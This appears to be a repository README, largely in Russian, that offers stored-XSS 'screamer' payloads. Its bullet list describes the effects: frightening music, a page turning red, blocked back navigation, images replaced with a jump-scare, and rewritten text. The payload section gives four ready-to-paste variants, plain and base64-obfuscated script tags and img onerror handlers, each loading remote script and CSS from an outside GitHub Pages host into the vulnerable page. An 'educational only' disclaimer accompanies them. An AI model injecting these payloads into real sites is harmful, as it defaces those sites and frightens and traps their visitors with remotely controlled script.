# XSS

Код сработает только при наличии уязвимости хранимый XSS + если сайт не будет блокировать загрузку внешних скриптов и стилей. <br>

* Страшная музыка.
* Постепенно изменяющийся цвет фона на красный.
* Прыгающий и мигающий текст.
* Нельзя вернуться на предыдущую страницу (зависит от браузера).
* Замена всех изображений на скример.
* Замена текста в тегах "p", "h1", "a".
* Замена всех тегов "a" на "p".
* Скример на весь экран с криком в течение какого-то времени.

⚠️ Important: This payload is for educational purposes only and for testing on your own or training systems. Use in real attacks violates laws and ethical standards. The author of the repository is not responsible for the use of this payload by third parties.

------------------------------------------

Полная версия (JS + CSS):

<script>var c=document.createElement('link');c.rel='stylesheet';c.href='//scullteam.github.io/XSS/styles.css';document.head.appendChild(c);var r=document.createElement('script');r.src='//scullteam.github.io/XSS/script.js';document.body.appendChild(r);</script>

# /

<script>eval(atob('PHNjcmlwdD52YXIgYz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdsaW5rJyk7Yy5yZWw9J3N0eWxlc2hlZXQnO2MuaHJlZj0nLy9zY3VsbHRlYW0uZ2l0aHViLmlvL1hTUy9zdHlsZXMuY3NzJztkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKGMpO3ZhciByPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpO3Iuc3JjPScvL3NjdWxsdGVhbS5naXRodWIuaW8vWFNTL3NjcmlwdC5qcyc7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChyKTs8L3NjcmlwdD4='))</script>

# ///

<img src="" alt="" onerror="var c=document.createElement('link');c.rel='stylesheet';c.href='//scullteam.github.io/XSS/styles.css';document.head.appendChild(c);var r=document.createElement('script');r.src='//scullteam.github.io/XSS/script.js';document.body.appendChild(r)">

# /

<img src="" onerror="eval(atob('PGltZyBzcmM9IiIgYWx0PSIiIG9uZXJyb3I9InZhciBjPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2xpbmsnKTtjLnJlbD0nc3R5bGVzaGVldCc7Yy5ocmVmPScvL3NjdWxsdGVhbS5naXRodWIuaW8vWFNTL3N0eWxlcy5jc3MnO2RvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQoYyk7dmFyIHI9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7ci5zcmM9Jy8vc2N1bGx0ZWFtLmdpdGh1Yi5pby9YU1Mvc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHIpIj4='))">
